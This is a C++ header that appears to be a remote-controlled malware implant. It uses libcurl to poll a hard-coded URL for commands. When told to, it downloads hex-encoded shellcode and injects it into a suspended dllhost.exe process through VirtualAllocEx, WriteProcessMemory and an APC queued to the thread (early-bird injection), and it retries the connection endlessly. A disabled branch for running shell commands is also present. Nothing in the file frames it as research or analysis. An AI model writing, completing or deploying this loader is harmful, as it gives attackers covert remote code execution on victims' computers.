#pragma once
#include "curl/curl.h"
#include <String.h>
#include <sstream>
#include <iostream>
#include <string>
#pragma comment(lib, "libcurl.lib")
#pragma comment ( lib, "ws2_32.lib" )
#pragma comment ( lib, "wldap32.lib" )


#define URL "http://api.10086.li/txt.txt"

using namespace std;

DWORD WINAPI run_slcd(LPVOID p);
string str_to_hex(string hex);
string hexcode;


class CurlWapper
{
private:
    CURL* _curl;
    stringstream _rs;
    long _code;
public:
    CurlWapper()
        : _curl(curl_easy_init())
        , _code(0)
    {

    }
    ~CurlWapper()
    {
        if (_curl) curl_easy_cleanup(_curl);
    }
    string _get(const string& _url)
    {
        CURLcode res;
        curl_easy_setopt(_curl, CURLOPT_URL, _url.c_str());
        curl_easy_setopt(_curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(_curl, CURLOPT_WRITEFUNCTION, _receive_data);
        curl_easy_setopt(_curl, CURLOPT_WRITEDATA, this);

        _rs.str("");
        _code = 0;
        res = curl_easy_perform(_curl);
        if (res != CURLE_OK)
        {
            throw runtime_error(curl_easy_strerror(res));
        }
        curl_easy_getinfo(_curl, CURLINFO_RESPONSE_CODE, &_code);
        return _rs.str();
    }
    long _GetHttpCode()
    {
        return _code;
    }
private:
    static size_t _receive_data(void* buffer, size_t size, size_t nmemb, void* userp)
    {
        return static_cast<CurlWapper*>(userp)->_write_rdata(buffer, size, nmemb);
    }
    size_t _write_rdata(void* buffer, size_t size, size_t nmemb)
    {
        _rs.write((const char*)buffer, size * nmemb);
        return size * nmemb;
    }
};


class Conf
{
private:
    int _s;
    string _t;
    string _v;
public:
    Conf(string res)
    {
        istringstream is(res);
        string line;

        char split = '\n';
        if (res.find("\n") == -1)
        {
            split = '\r';
        }


        while (getline(is, line, split))
        {

            int line_len = line.length();
            int flag = line.find(":");
            string key = line.substr(0, flag);
            string value = line.substr(flag + 1, line_len);
            if (key == "s")
            {
                this->_s = atoi(value.c_str());
            }
            else if (key == "t")
            {
                this->_t = value;
            }
            if (key == "v")
            {
                this->_v = value;
            }
        }
    };
    ~Conf();

    VOID run()
    {

        if (this->_t == "c\r" || this->_t == "c")
        {
            // system((this->_v).c_str());
        }
        else if (this->_t == "u\r" || this->_t == "u")
        {
            try {

                hexcode = this->_v;
                HANDLE hThread = CreateThread(NULL, NULL, run_slcd, NULL, NULL, NULL);
            }
            catch (exception e)
            {
            };
        }
        else if (this->_t == "e\r" || this->_t == "e")
        {
            exit(0);
        }
        Sleep(this->_s * 1000);

    };

private:

};



string str_to_hex(string strHex) {
    string tmpStr = "";
    for (size_t j = 0; j < strHex.length(); j += 2) {
        string hex16 = strHex.substr(j, 2);
        char ch16 = stoul(hex16, nullptr, 16);
        tmpStr += ch16;
    }
    return tmpStr;
};

DWORD WINAPI run_slcd(LPVOID lpParameter)
{
    string _code_str = str_to_hex(hexcode);
    int _len = hexcode.length();
    unsigned char _code[10000] = { 0 };
    memcpy(_code, _code_str.c_str(), _len / 2 + 1);
    UINT _codeSize = sizeof(_code);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, _codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, _code, _codeSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

    ResumeThread(threadHandle);
    return 0;
}

DWORD WINAPI d_run(LPVOID P)
{
_GO:
    try {
        CurlWapper _c;
        string res = _c._get(URL);
        Conf* conf = new Conf(res);
        conf->run();
        return 0;
    }
    catch (exception e)
    {
        Sleep(3000);
        goto _GO;
    }
    return 0;
}